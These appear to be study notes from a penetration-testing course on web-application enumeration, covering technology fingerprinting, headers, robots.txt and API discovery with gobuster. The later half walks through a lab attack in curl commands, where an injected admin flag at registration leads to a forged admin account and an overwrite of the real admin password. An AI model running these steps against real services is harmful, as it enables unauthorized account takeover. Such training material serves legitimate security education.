
Before launching attacks against a web app, discover the technology stack in use. 

* Host OS
* Web server software
* Database software
* Frontend/backend programming language

Once this is known, we can use a browser's developer tools to gather even more info. 

### Debugging Page Content

Start with URL address. Check for
1. *file extensions* like `.php` to reveal the programming language the app was developed in
	1. Java-based apps may have `.jsp`, `.do`, `.html`

Check Firefox *Debugger* tool to see
1. JavaScript frameworks
2. Hidden input fields
3. Comments
4. Client-side controls within HTML
5. JavaScript
6. MORE

Use _Pretty print source_ button to make code easier to read

![Figure 17: Pretty Print Source](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/4d417edb1f3f1262db7b910f3bcd9c23-webenum02.png)

### Inspecting HTTP Response Headers and Sitemaps

#### Response Headers

Using Browser's *Network* tool to view requests

![Figure 21: Using the Network Tool to View Requests](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/8b9e710a33a627490ce29c3497f9b3eb-webenum06.png)

Viewing Response Headers in the Network Tool

![Figure 22: Viewing Response Headers in the Network Tool](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/1a9e9513ea361b887835c79807bc5cbd-webenum07.png)

Server headers often reveal server software and sometimes version number. 

Non-Standard Headers:
* _X-Powered-By_
* _x-amz-cf-id_ (Uses Amazon CloudFront)
* _X-Aspnet-Version_

#### Sitemaps 

Web apps can include sitemaps to help search engines crawl and index their sites. 

Also include pages not to crawl such as admin consoles. 

Sitemaps protocol handles inclusive directories 

`robots.txt`excludes URLs from being crawled 

Retrieve a robots.txt from google using #curl 

```bash
kali@kali:~$ curl https://www.google.com/robots.txt
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
Disallow: /index.html?
Disallow: /?
Allow: /?hl=
...
```

### Enumerating and Abusing APIs

_Representational State Transfer_ (REST) is used for a variety of purposes, including authentication

Bruteforcing API endpoints using #gobuster against server running on port 5001 on 192.168.50.16

API paths often include version number:

```
/api_name/v1
```


Bruteforcing this path using a wordlist and Gobuster's *pattern* feature.

Create simple pattern file:

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

`{GOBUSTER}` is a placeholder for words in our wordlist

Enumerate the API with Gobuster

```hl:17,20
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (1 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```

Inspect `/users` API with #curl 

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 09:27:50 GMT

{
  "users": [
    {
      "email": "mail1@mail.com",
      "username": "name1"
    },
    {
      "email": "mail2@mail.com",
      "username": "name2"
    },
    {
      "email": "admin@mail.com",
      "username": "admin"
    }
  ]
}
```

We can use this knowledge of users to discover extra APIs.

Using #gobuster again

```hlt:/password
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]

===============================================================
2022/04/06 06:40:35 Finished
===============================================================
```

Found new API path `/password`

Use curl to enumerate

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

Received `405 METHOD NOT ALLOWED`

#curl uses GET method by default so we could attempt a POST or PUT method instead. 

First, verifying if login method is supported / Enumerating `/login` API

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT

{ "status": "fail", "message": "User not found"}
```

Received `404 NOT FOUND`, but still received `User not found` which means that `login` is a valid API. 

How to interact with it?

Crafting a POST request against the login API

```
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```

Received response that authentication failed. We don't know admin's password so maybe we can create a new user. 

Attempting new User Registration

```
kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

{ "status": "fail", "message": "'email' is a required property"}
```

The API requests an email address. 

Let's supply an email and an `"admin":"True"` key.

Attempting to register a new user as admin

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```
We were able to create a new admin user. 

Try to login with these credentials by invoking `login` API

Logging in as an admin user

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
```
Log in success and received JWT authentication token. Use this token to change the admin user password to obtain tangible proof that we are also an admin. 

Forging a POST request that targets the **password** API

Attempting to Change the Administrator Password via a POST request

```
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

Got `405 Method Not Allowed`

Let's attempt the PUT method instead.

Attempting to Change the Administrator Password via a PUT request

```
kali@kali:~$ curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```
No error message. Prove this attack succeeded by logging in as admin with newly changed password. 

```
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```
This attack can also be replicated more easily with Burp.

Crafting a POST request in Burp for API testing

![Figure 23: Crafting a POST request in Burp for API testing](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/52e79b4472fa121dd7d260386dc6a9f7-webenum_api01.png)

Inspecting the API response value

![Figure 24: Inspecting the API response value](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/95e7f350565cf4049f29a9636984b47b-webenum_api02.png)

